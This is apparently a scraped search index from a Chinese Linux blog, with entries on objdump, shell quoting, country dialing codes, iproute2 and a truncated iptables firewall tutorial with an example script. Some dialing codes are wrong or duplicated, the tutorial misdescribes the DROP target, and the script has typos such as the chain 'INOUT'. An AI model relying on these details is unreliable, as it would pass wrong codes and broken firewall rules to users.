HTTP/1.1 200 OK\n        Tus-Extension: creation,creation-with-upload,termination\n        Tus-Resumable: 1.0.0\n        Tus-Version: 1.0.0\n        X-Content-Type-Options: nosniff\n        Date: Fri, 20 Jan 2017 10:10:31 GMT\n        Content-Length: 0\n        Content-Type: text/plain; charset=utf-8\n      `","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 objdump","title":"gcc objdump 反汇编","text":"objdump -s -d global   global.txt 是反汇编 global\n\n    -s 参数可以将所有段的内容以十六进制的方式打印出来\n    -d 参数可以将所有包含指令的段反汇编\n      global.txt 是将标准输出输出到 global.txt 文件 （专业点的话，叫\"输出重定向\"）","tags":null},{"location":"//blog.pytool.com/basic/2017-05-07 (双引号)与 (单引号)的区别 ","title":"(双引号)与(单引号)的区别","text":"---\n(双引号\")与 (单引号')的区别\n\n　\n　　你在shell prompt后面敲打键盘、直到按下enter的时候，你输入的文字就是command line了，然后shell才会以进程方式执行你所提交的命令。但是，你又可知道：你在command line输入的每一个文字，对shell来说，有什么类别之分呢？\n\n简单而言，command line的每一个charactor分为如下两种：\n   literal：也就是普通纯文字，对shell来说没有特殊功能。\n   meta：对shell来说，具有特定功能的保留字。\nliteral没有什么好说的，凡是 abcd、123456 等这些“文字”都是literal。但是meta确常使我们困惑。事实上，前两章我们在command line中已碰到两个几乎每次都会碰到的meta：\n    IFS：由space tab enter三者之一组成（我们常用space）。\n    CR：由enter产生。\nIFS是用来拆分command line的每一个词（word）用的，因为shell command line是按词来处理的。而CR则是用来结束command line用的，这也是为何我们敲enter命令就会执行的原因。除了IFS和CR外，常用的meta还有：\n= ：  设定变量。\n$ ：  做变量或运算替换(请不要与 shell prompt 搞混了)。\n  ：  重定向 stdout。\n  \u003c ：  重定向 stdin。\n  |：   管道命令。\n  \u0026 ：  重定向 file descriptor ，或将命令置于后台执行。\n  ( )： 將其內的命令置于 nested subshell 执行，或用于运算或命令替换。\n  { }： 將其內的命令置于 non-named function 中执行，或用在变量替换的界定范围。\n  ; ：  在前一个命令结束时，而忽略其返回值，继续执行下一個命令。\n  \u0026\u0026 ： 在前一個命令结束时，若返回值为 true，继续执行下一個命令。\n  || ： 在前一個命令结束时，若返回值为 false，继续执行下一個命令。\n  !：   执行 history 列表中的命令\n  ....\n  假如我们要在command line中将这些保留元字符的功能关闭的话，就要用到 quoting 处理了。\n  在bash中，我们常用的 quoting有如下三种方法：\n    hard quote：''（单引号），凡在hard quote中的所有meta均被关闭。\n    soft quote：\"\"（双引号），在soft quote中的大部分meta都会被关闭，但某些保留（如$）。\n    *escape：\\ （反斜线），只有紧接在escape（跳脱字符）之后的单一meta才被关闭。\n\n下面的例子將有助于我们对 quoting 的了解：\n\n        $ A=B C         空白键未被关闭，作为IFS 处理。\n        $ C: command not found.\n        $ echo $A\n    \n        $ A=\"B C\"        # 空白键已被关闭，仅作空白符号处理。\n        $ echo $A\n        B C\n\n在第一次设定 A 变量时，由于空白键没有被关闭，command line 将被解读为：\nA=B 然后碰到IFS，再执行 C 命令\n  在第二次设定 A 变量时，由于空白键置于 soft quote 中，因此被关闭，不再作为 IFS ：\nA=BspaceC\n  事实上，空白键无论在 soft quote 还是在 hard quote 中，均会被关闭。Enter 鍵亦然：\n        $ A='B\n          C\n          '\n        $ echo \"$A\"\n        B\n        C\n\n在上例中，由于 enter 被置于 hard quote 当中，因此不再作为 CR 字符來处理。\n这里的 enter 单纯只是一个断行符号(new-line)而已，由于 command line 并沒得到 CR 字符，\n因此进入第二個 shell prompt (PS2，以   符号表示)，command line 并不会结束，\n直到第三行，我们输入的 enter 并不在  hard quote 里面，因此并沒被关闭，\n此时，command line 碰到 CR 字符，于是结束、交给 shell 來处理。\n\n上例的 enter 要是被置于 soft quote 中的话， CR 也会同样被关闭：\n        $ A=\"B\n          C\n          \"\n        $ echo $A\n        B C\n\n然而，由于 echo $A 时的变量沒置于 soft quote 中，因此当变量替换完成后并作命令行重组时，enter 会被解释为 IFS ，而不是解释为 New Line 字符。\n\n同样的，用 escape 亦可关闭 CR 字符：\n        $ A=B\\\n          C\\\n          $ echo $A\n        BC\n\n上例中，第一个 enter 跟第二个 enter 均被 escape 字符关闭了，因此也不作为 CR 來处理，\n但第三个 enter 由于没有被跳脱，因此作为 CR 结束 command line 。\n但由于 enter 鍵本身在 shell meta 中的特殊性，在 \\ 跳脱后面，仅仅取消其 CR 功能，而不会保留其 IFS 功能。\n\n您或许发现光是一个 enter 鍵所产生的字符就有可能是如下这些可能：\nCR\nIFS\nNL(New Line)\nFF(Form Feed)\nNULL\n...\n\n至于 soft quote 跟 hard quote 的不同，主要是对于某些 meta 的关闭与否，以 $ 來作说明：\n        $ A=B\\ C\n        $ echo \"$A\"\n        B C\n        $ echo '$A'\n        $A\n\n在第一个 echo 命令行中，$ 被置于 soft quote 中，將不被关闭，因此继续处理变量替换，\n因此 echo 將 A 的变量值输出到屏幕，也就得到  \"B C\" 的结果。\n在第二个 echo 命令行中，$ 被置于 hard quote 中，则被关闭，因此 $ 只是一个 $ 符号，\n并不会用來作变量替换处理，因此结果是 $ 符号后面接一个 A 字母：$A 。","tags":null},{"location":"//blog.pytool.com/basic/2017-05-07 国家代码","title":"国家代码","text":"国际域名缩写 \t国家或地区 \t英文名 \t电话代码\nAD \t安道尔共和国 \tAndorra \t376\nAE \t阿拉伯联合酋长国 \tUnited Arab Emirates \t971\nAF \t阿富汗 \tAfghanistan \t93\nAG \t安提瓜和巴布达 \tAntigua and Barbuda \t1268\nAI \t安圭拉岛 \tAnguilla \t1264\nAL \t阿尔巴尼亚 \tAlbania \t355\nAM \t亚美尼亚 \tArmenia \t374\n\t阿森松 \tAscension \t247\nAO \t安哥拉 \tAngola \t244\nAR \t阿根廷 \tArgentina \t54\nAT \t奥地利 \tAustria \t43\nAU \t澳大利亚 \tAustralia \t61\nAZ \t阿塞拜疆 \tAzerbaijan \t994\nBB \t巴巴多斯 \tBarbados \t1246\nBD \t孟加拉国 \tBangladesh \t880\nBE \t比利时 \tBelgium \t32\nBF \t布基纳法索 \tBurkina-faso \t226\nBG \t保加利亚 \tBulgaria \t359\nBH \t巴林 \tBahrain \t973\nBI \t布隆迪 \tBurundi \t257\nBJ \t贝宁 \tBenin \t229\nBL \t巴勒斯坦 \tPalestine \t970\nBM \t百慕大群岛 \tBermuda Is. \t1441\nBN \t文莱 \tBrunei \t673\nBO \t玻利维亚 \tBolivia \t591\nBR \t巴西 \tBrazil \t55\nBS \t巴哈马 \tBahamas \t1242\nBW \t博茨瓦纳 \tBotswana \t267\nBY \t白俄罗斯 \tBelarus \t375\nBZ \t伯利兹 \tBelize \t501\nCA \t加拿大 \tCanada \t1\n\t开曼群岛 \tCayman Is. \t1345\nCF \t中非共和国 \tCentral African Republic \t236\nCG \t刚果 \tCongo \t242\nCH \t瑞士 \tSwitzerland \t41\nCK \t库克群岛 \tCook Is. \t682\nCL \t智利 \tChile \t56\nCM \t喀麦隆 \tCameroon \t237\nCN \t中国 \tChina \t86\nCO \t哥伦比亚 \tColombia \t57\nCR \t哥斯达黎加 \tCosta Rica \t506\nCS \t捷克 \tCzech \t420\nCU \t古巴 \tCuba \t53\nCY \t塞浦路斯 \tCyprus \t357\nCZ \t捷克 \tCzech Republic \t420\nDE \t德国 \tGermany \t49\nDJ \t吉布提 \tDjibouti \t253\nDK \t丹麦 \tDenmark \t45\nDO \t多米尼加共和国 \tDominica Rep. \t1890\nDZ \t阿尔及利亚 \tAlgeria \t213\nEC \t厄瓜多尔 \tEcuador \t593\nEE \t爱沙尼亚 \tEstonia \t372\nEG \t埃及 \tEgypt \t20\nES \t西班牙 \tSpain \t34\nET \t埃塞俄比亚 \tEthiopia \t251\nFI \t芬兰 \tFinland \t358\nFJ \t斐济 \tFiji \t679\nFR \t法国 \tFrance \t33\nGA \t加蓬 \tGabon \t241\nGB \t英国 \tUnited Kiongdom \t44\nGD \t格林纳达 \tGrenada \t1809\nGE \t格鲁吉亚 \tGeorgia \t995\nGF \t法属圭亚那 \tFrench Guiana \t594\nGH \t加纳 \tGhana \t233\nGI \t直布罗陀 \tGibraltar \t350\nGM \t冈比亚 \tGambia \t220\nGN \t几内亚 \tGuinea \t224\nGR \t希腊 \tGreece \t30\nGT \t危地马拉 \tGuatemala \t502\nGU \t关岛 \tGuam \t1671\nGY \t圭亚那 \tGuyana \t592\nHK \t香港特别行政区 \tHongkong \t852\nHN \t洪都拉斯 \tHonduras \t504\nHT \t海地 \tHaiti \t509\nHU \t匈牙利 \tHungary \t36\nID \t印度尼西亚 \tIndonesia \t62\nIE \t爱尔兰 \tIreland \t353\nIL \t以色列 \tIsrael \t972\nIN \t印度 \tIndia \t91\nIQ \t伊拉克 \tIraq \t964\nIR \t伊朗 \tIran \t98\nIS \t冰岛 \tIceland \t354\nIT \t意大利 \tItaly \t39\n\t科特迪瓦 \tIvory Coast \t225\nJM \t牙买加 \tJamaica \t1876\nJO \t约旦 \tJordan \t962\nJP \t日本 \tJapan \t81\nKE \t肯尼亚 \tKenya \t254\nKG \t吉尔吉斯坦 \tKyrgyzstan \t331\nKH \t柬埔寨 \tKampuchea (Cambodia ) \t855\nKP \t朝鲜 \tNorth Korea \t850\nKR \t韩国 \tKorea \t82\nKT \t科特迪瓦共和国 \tRepublic of Ivory Coast \t225\nKW \t科威特 \tKuwait \t965\nKZ \t哈萨克斯坦 \t\n\nKazakstan\n\t327\nLA \t老挝 \tLaos \t856\nLB \t黎巴嫩 \tLebanon \t961\nLC \t圣卢西亚 \tSt.Lucia \t1758\nLI \t列支敦士登 \tLiechtenstein \t423\nLK \t斯里兰卡 \tSri Lanka \t94\nLR \t利比里亚 \tLiberia \t231\nLS \t莱索托 \tLesotho \t266\nLT \t立陶宛 \tLithuania \t370\nLU \t卢森堡 \tLuxembourg \t352\nLV \t拉脱维亚 \tLatvia \t371\nLY \t利比亚 \tLibya \t218\nMA \t摩洛哥 \tMorocco \t212\nMC \t摩纳哥 \tMonaco \t377\nMD \t摩尔多瓦 \tMoldova, Republic of \t373\nMG \t马达加斯加 \tMadagascar \t261\nML \t马里 \tMali \t223\nMM \t缅甸 \tBurma \t95\nMN \t蒙古 \tMongolia \t976\nMO \t澳门 \tMacao \t853\nMS \t蒙特塞拉特岛 \tMontserrat Is \t1664\nMT \t马耳他 \tMalta \t356\n\t马里亚那群岛 \tMariana Is \t1670\n\t马提尼克 \tMartinique \t596\nMU \t毛里求斯 \tMauritius \t230\nMV \t马尔代夫 \tMaldives \t960\nMW \t马拉维 \tMalawi \t265\nMX \t墨西哥 \tMexico \t52\nMY \t马来西亚 \tMalaysia \t60\nMZ \t莫桑比克 \tMozambique \t258\nNA \t纳米比亚 \tNamibia \t264\nNE \t尼日尔 \tNiger \t977\nNG \t尼日利亚 \tNigeria \t234\nNI \t尼加拉瓜 \tNicaragua \t505\nNL \t荷兰 \tNetherlands \t31\nNO \t挪威 \tNorway \t47\nNP \t尼泊尔 \tNepal \t977\n\t荷属安的列斯 \tNetheriands Antilles \t599\nNR \t瑙鲁 \tNauru \t674\nNZ \t新西兰 \tNew Zealand \t64\nOM \t阿曼 \tOman \t968\nPA \t巴拿马 \tPanama \t507\nPE \t秘鲁 \tPeru \t51\nPF \t法属玻利尼西亚 \tFrench Polynesia \t689\nPG \t巴布亚新几内亚 \tPapua New Cuinea \t675\nPH \t菲律宾 \tPhilippines \t63\nPK \t巴基斯坦 \tPakistan \t92\nPL \t波兰 \tPoland \t48\nPR \t波多黎各 \tPuerto Rico \t1787\nPT \t葡萄牙 \tPortugal \t351\nPY \t巴拉圭 \tParaguay \t595\nQA \t卡塔尔 \tQatar \t974\n\t留尼旺 \tReunion \t262\nRO \t罗马尼亚 \tRomania \t40\nRU \t俄罗斯 \tRussia \t7\nSA \t沙特阿拉伯 \tSaudi Arabia \t966\nSB \t所罗门群岛 \tSolomon Is \t677\nSC \t塞舌尔 \tSeychelles \t248\nSD \t苏丹 \tSudan \t249\nSE \t瑞典 \tSweden \t46\nSG \t新加坡 \tSingapore \t65\nSI \t斯洛文尼亚 \tSlovenia \t386\nSK \t斯洛伐克 \tSlovakia \t421\nSL \t塞拉利昂 \tSierra Leone \t232\nSM \t圣马力诺 \tSan Marino \t378\n\t东萨摩亚(美) \tSamoa Eastern \t684\n\t西萨摩亚 \tSan Marino \t685\nSN \t塞内加尔 \tSenegal \t221\nSO \t索马里 \tSomali \t252\nSR \t苏里南 \tSuriname \t597\nST \t圣多美和普林西比 \tSao Tome and Principe \t239\nSV \t萨尔瓦多 \tEI Salvador \t503\nSY \t叙利亚 \tSyria \t963\nSZ \t斯威士兰 \tSwaziland \t268\nTD \t乍得 \tChad \t235\nTG \t多哥 \tTogo \t228\nTH \t泰国 \tThailand \t66\nTJ \t塔吉克斯坦 \tTajikstan \t992\nTM \t土库曼斯坦 \tTurkmenistan \t993\nTN \t突尼斯 \tTunisia \t216\nTO \t汤加 \tTonga \t676\nTR \t土耳其 \tTurkey \t90\nTT \t特立尼达和多巴哥 \tTrinidad and Tobago \t1809\nTW \t台湾省 \tTaiwan \t886\nTZ \t坦桑尼亚 \tTanzania \t255\nUA \t乌克兰 \tUkraine \t380\nUG \t乌干达 \tUganda \t256\nUS \t美国 \tUnited States of America \t1\nUY \t乌拉圭 \tUruguay \t598\nUZ \t乌兹别克斯坦 \tUzbekistan \t233\nVC \t圣文森特岛 \tSaint Vincent \t1784\nVE \t委内瑞拉 \tVenezuela \t58\nVN \t越南 \tVietnam \t84\nYE \t也门 \tYemen \t967\nYU \t南斯拉夫 \tYugoslavia \t381\nZA \t南非 \tSouth Africa \t27\nZM \t赞比亚 \tZambia \t260\nZR \t扎伊尔 \tZaire \t243\nZW \t津巴布韦 \tZimbabwe \t263","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/2016-01-01 Linux命令 Iproute2","title":"Linux命令 Iproute2","text":"\n\n用途 \tnet-tool（被淘汰） \tiproute2\n地址和链路配置 \tifconfig \tip addr, ip link\n路由表 \troute \tip route\n邻居 \tarp \tip neigh\nVLAN \tvconfig \tip link\n隧道 \tiptunnel \tip tunnel\n组播 \tipmaddr \tip maddr\n统计 \tnetstat \tss\n\n场景一：我想查看当前服务器的网络连接统计】\n\n$ ss -s\n场景二：我想查看所有打开的网络端口】\n\n$ ss -l\n场景三：我想查看这台服务器上所有的socket连接】\n\nss -a","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/iptables详解及7层过滤","title":"Linux命令 iptables","text":"---\n iptables 详解及7层过滤\n\nspan class=\"artTime\"2013-07-04 16:03:59/span\n\n标签：a href=\"http://blog.51cto.com/tag-防火墙.html\" class=\"operlink\"防火墙/a a href=\"http://blog.51cto.com/tag-iptables.html\" class=\"operlink\"iptables/a a href=\"http://blog.51cto.com/tag-七层过滤.html\" class=\"operlink\"七层过滤/a\n\n原创作品，允许转载，转载时请务必以超链接形式标明文章 原始出处 、作者信息和本声明。否则将追究法律责任。http://freeloda.blog.51cto.com/2033581/1241545\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"大纲/span\n\n  span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"一、防火墙简介\n  二、防火墙分类\n  三、防火墙在企业中的部署\n  四、IPTABLES的简介\n  五、IPTABLES的表和链\n  六、IPTABLES的几个状态\n  七、IPTABLES的命令及使用\n  八、IPTABLES的脚本编写\n  九、IPTABLES的7层过滤/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"注：本文的测试环境（CentOS 5.5 X86\\64）/span\n\nspan style=\"font-size:14px;\"\n/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"一、防火墙简介/span\n\n  span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"防火墙其实就是一个加固主机或网络安全的一个设备或者软件而已,通过防火墙可以隔离风险区域与安全区域的连接,同时不会妨碍风险区域的访问。当然需要注意的是世界上没有绝对的安全,防火墙也只是启到一定的安全防护。大多数的安全风险还是在内网当中！/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"二、防火墙的分类/span\n\n  span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"(1).从特点上分类/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"第一种，软件防火墙,软件防火墙需要运行在特定的计算机上,而且需要计算机的操作系统的支持。/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"第二种，硬件防火墙,硬件防火墙其实就是一个普通pc机的架构,然后上面跑有专门的操作系统。/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"第三种，芯片级的防火墙,这种防火墙基于专门的硬件平台,没有操作系统,专有的ASIC芯片使它们比其他类的防火墙速度更快,处理能力极强,性能更高,但是价格却极其昂贵。/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"(2).从技术上分类/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"第一种，包过滤型防火墙,这类的防火墙主要是工作在网络层,根据事先设定好的规则进行检查,检查结果根据事先设定好的处理机制进行处理。/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"第二种，应用层防火墙,它是工作在TCP/IP模型中的最高层应用层,相比较来说速度要慢一点。/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"第三种，状态监视器,状态监视做为防火墙其安全性为最佳,但配置比较复杂,且网络速度较慢。/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"三、防火墙在企业中的部署/span\n\n  span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"(1). 单宿主堡垒主机：是单台服务器有防火墙,只为单台服务器防护。/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"(2). 双宿主堡垒主机：双宿主堡垒主机是一台装有两块网卡的堡垒主机,一般这台堡垒主机应用在网关,防护局域网跟广域网之间通信等安全。/span\n        span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"(3).三宿主堡垒主机：三宿主堡垒主机是一台装有三块网卡的堡垒主机,那么他将外网,内网,DMZ 三个区域隔离开来,同时保护内网已经DMZ区域的安全等。/span\n        span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"(4).背靠背型，如下图：/span\n        span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"不用解释一看图就知道是怎么回事了,实际上前端防火墙是防护外网到DMZ区域以及到内网,后端防火墙是防护内网到DMZ区域的安全。好了说了这么多，下面我们说说iptables在linux中的应用！/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"四、IPTABLES的简介/span\n\n  span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"IPTABLES/netfilter(/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"官方网站，http://www.netfilter.org/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\") 其实大多数人都认为iptables是linux系统上的一个服务,其实不是的. 我们linux系统上的服务比如说httpd服务在启动起来的时候,是不是在后台启动一个相应的服务进程且在网卡上监听一个端口,而iptables却不然,那么iptables到底是什么呢？其实iptables只是一个工具而已.我们的linux系统有用户空间,和内核空间,而iptables有两个组件,一是netfilter,  netfilter组件只是用来过滤防火墙规则,及作出相应的处理机制的,它是集成在内核中的一部分,也就是说它是工作在内核空间的,那么大家都知道用户是不可能直接跟内核空间打交道的,那么netfilter只是工作在内核空间对规则进行处理的,那么规则从何而来呢? 是从iptables的第二个组件iptables而来的,我们上面说了IPTABLES只是一个工作在用户空间的一个工具而已,那么用户就使用这个工具的一个命令来跟工作在内核空间中的netfiter组件打交道的.其实IPTABLES防火墙就是这样的。/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"五、IPTABLES的表和链/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"IPTABLES常用的表和链有三个，分别为 filter表 nat表 mangle表, 和五个链 INPUT链 OUTPUT链 FORWARE链 POSTROUTING链 PREROUTING链,下面来介绍下它们的各个功能，\n1.filter表\n      filter表主要是过滤数据包的,IPTABLES几乎所有的数据包过滤都在此表中实现的,filter表也是IPTABLES中默认的表,此表中还包含三个链如下：\n(1).INPUT链\n       过滤所有的目标地址是本机的数据包\n(2).OUTPUT链\n         过滤所有从本机出去的数据包\n(3).FORWORD链\n         过滤所有从本机路过的数据包\n2.nat表\n      nat表主要是用于做网络地址转换的(NAT),在IPTABLES中可以做SNAT(源地址转换),DNAT(目标地址转换),PANT(即跟SNAT差不多,不一样的是SNAT的源地址是固定的,而PNAT的源地址是不固定的,当使用ppp或pppoe的方式连接互联网的时候一般适应这个) nat表中包含两个链如下：\n(1).PREROUTING链\n   在数据包到达防火墙的时候改变目标地址 DNAT应用于此链.\n(2).OUTPUT链\n         可以改变本地产生的数据包的目标地址\n(3).POSTROUTING链\n         在数据包离开防火墙的时候改变源地址,SNAT应用于次链\n3.mangle表\n       mangle表主要是修改数据包头部信息的,此表中包含以下5条链:\n(1).PREROUTING链,\n         在数据包进入防火墙之后,也称为路由前,\n(2).POSTROUTING链,\n          在数据包确定目标地址后,也称为路由后,\n(3).OUTPUT链\n          从本机出去的时间包路由前\n(4).INPUT链\n          数据包进入本机后,路由后\n(5).FORWARD链\n          第一次路由判断之后,最后一次路由判断之前改变数据包/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"4.数据包过滤匹配流程/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"六、IPTABLES的几个状态/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"IPTABLES的状态跟踪连接有4种,分别是,NEW,ESTABLISHED,RELATED,INVALID,除了从本机出去的数据包有NAT表的OUTPUT链处理外,其他所有的状态跟踪都在NAT表中的PREROUTING链中处理,下面来说下4种状态是什么， /span\n\n  span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"1.NEW状态\n         NEW状态的数据包说明这个数据包是收到的第一个数据包。\n  2.ESTABLISHED状态\n        只要发送并接到应答,一个数据包的状态就从NEW变为ESTABLEISHED,而且该状态会继续匹配这个连接后继数据包。\n  3.RELATED状态\n        当一个数据包的状态处于ESTABLSHED状态的连接有关系的时候,就会被认为是RELATED,也就是说一个链接想要是RELATED状态,首先要有一个ESTABLISHED的连接。\n  4.INVALID状态\n        不能被识别属于哪个连接状态或没有任何关系的状态,一般这中数据包要被拒绝的。/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"七、IPTABLES的命令及使用/span\n\n  span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"iptables在CentOS或RHEL的系统上默认安装的, IPTABLES的命令选项主要分为这么几大类,规则管理,链管理,默认规则管理,查看,匹配条件,处理动作等，下面我们就来说明一下，/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"1.规则管理/span\n      iptables -A    添加一条新规则\n  iptables -I    插入一条新规则 -I 后面加一数字表示插入到哪行\n  iptables -D    删除一条新规则 -D 后面加一数字表示删除哪行\n  iptables -R    替换一条新规则 -R 后面加一数字表示替换哪行\n      span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"2.链管理/span\n      iptables -F    清空链中的所有规则\n  iptables -N    新建一个链\n  iptables -X    删除一个自定义链,删除之前要保证次链是空的,而且没有被引用\n  iptables -E    重命名链\n      span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"3.默认规则管理/span\n      iptables -P    设置默认规则\n      span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"4.查看/span\n      iptables -L    查看规则 –L 还有几个子选项如下\n  iptables -L -n 以数字的方式显示\n  iptables -L -v 显示详细信息\n  iptables -L -x 显示精确信息\n  iptables -L --line-numbers 显示行号\n      span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"5.条件匹配/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"(1).基本匹配/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"条件匹配也可以使用 ! 取反 /span\n      -s    源地址\n  -d    目标地址\n  -p    协议{tcp|udp|icmp}\n  -i    从哪个网络接口进入,比如 -i eth0\n  -o    从哪个网络接口出去,比如 -o eth0\n      span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"(2).扩展匹配/span\n    span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"隐含扩展匹配/span\n      -p {tcp|udp} --sport   指定源端口\n  -p {tcp|udp} --dport   指定目标端口\n      span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"显示扩展匹配/span\n      -m state --state   匹配状态的\n  -m mutiport --source-port   端口匹配 ,指定一组端口\n  -m limit --limit 3/minute   每三分种一次\n  -m limit --limit-burst  5   只匹配5个数据包\n  -m string --string --algo bm|kmp --string \"xxxx\"  匹配字符串\n  -m time --timestart 8:00 --timestop 12:00  表示从哪个时间到哪个时间段\n  -m time --days    表示那天\n  -m mac --mac-source xx:xx:xx:xx:xx:xx 匹配源MAC地址\n  -m layer7 --l7proto qq   表示匹配腾讯qq的 当然也支持很多协议,这个默认是没有的,需要我们给内核打补丁并重新编译内核及iptables才可以使用 -m layer7 这个显示扩展匹配\n      span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"6.处理动作/span\n      -j ACCEPT   允许\n  -j REJECT    拒绝\n  -j DROP       拒绝并提示信息\n  -j SNAT       源地址转换\n  -j DNAT       目标地址转换\n  -j REDIRECT   重定向\n  -j MASQUERAED  地址伪装\n  -j LOG --log-prefix \"说明信息,自己随便定义\"      记录日志\n  span style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"八、IPTABLES的脚本编写/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"IPTABLES 脚本里面其实就是敲的一系列命令而已下面给个例子,介绍下iptables命令的使用及IPTABLES脚本的编写 /span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"1.IPTABLES脚本实例\n/span\n\nvim iptables.sh\n!/bin/bash\n\n定义变量\nmynet=192.168.10.0/24\nmyip=192.168.10.100\nIPT=/sbin/iptables\n加载ftp模块\nmodprobe ipconntrack-ftp\nmodprobe ipnatftp\n开启路由转发功能\necho \"1\" /proc/sys/net/ipv4/ipforward\n清空所有表中的规则\n$IPT -F\n$IPT -t nat –F\n$IPT -t mangle –F\n删除所有自定义链\n$IPT -X\n$IPT -t nat -X\n$IPT -t mangle –X\n设置默认策略\n$IPT -P INPUT DROP\n$IPT -P OUTPUT DROP\n$IPT -P FORWARD ACCEPT\n允许状态为ESTABLISHED,RELATED的访问本机,及状态为NEW的从本机出去\n$IPT -A INOUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n允许本地环回口访问\n$IPT -A INPUT -i lo -j ACCEPT\n$IPT -A OUTPUT -o lo -j ACCEPT\n允许管理员主机访问本地ssh服务\n$IPT -A INPUT -s $myip -m state --state NEW -p tcp --dport 22 -j ACCEPT\n$IPT -A OUTPUT -d $myip -p tcp --sport 22 -j ACCEPT\n允许局域网的ping请求\n$IPT -A INPUT -s $mynet -p icmp --icmp-type 8 -j ACCEPT\n$IPT -A OUTPUT -d $mynet -p icmp --icmp-type 0 -j ACCEPT\n为局域网做SNAT\n$IPT -t nat -A POSTROUTING -s $mynet -j SNAT --to-source 222.95.1.97\n为局域网内部的web服务器做DNAT\n$IPT -t nat -A PREROUTING -d 222.95.1.97 -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1\n\nspan style=\"font-size:14px;color:000000;font-family:arial, helvetica, sans-serif;\"2.让下次开机自动加载脚本 /span\nspan style=\"font-size:14px;\"/span\n\n[root@localhost ~]# echo \"/bin/bash /root/shell/iptables.sh\"     /etc/rc.local\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"九、IPTABLES的7层过滤/span\nspan style=\"font-size:14px;\"/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"说明：为网络管理员,对P2P,QQ,酷狗,等软件是又爱又恨,大多数公司,为了提高工作效率禁止公司员工上QQ,看视频等,  在市场上买专门的上网行为管理设备,随便都是好几W,而使用linux来做网关,一样可以禁止qq,酷狗等软件,成本才几千块,下面将介绍下怎么实现的！/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"1.简介/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"      在Linux的防火墙体系/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"Netfilter/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"下有一个独立的模块/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"L7 filter/spanspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\" 。从字面上看Netfilter是对网络数据的过滤，L7 filter是基于数据流应用层内容的过滤。不过实际上 L7 filter的本职工作不是对数据流进行过滤而是对数据流进行分类。它使用模式匹配算法把进入设备的数据包应用层内容与事先定义好的协议规则进行比对，如果匹配成功就说明这个数据包属于某种协议。/span\n\nspan style=\"font-size:14px;color:#000000;font-family:arial, helvetica, sans-serif;\"L7 filter是基于数据流工作的，建立在Netfilter 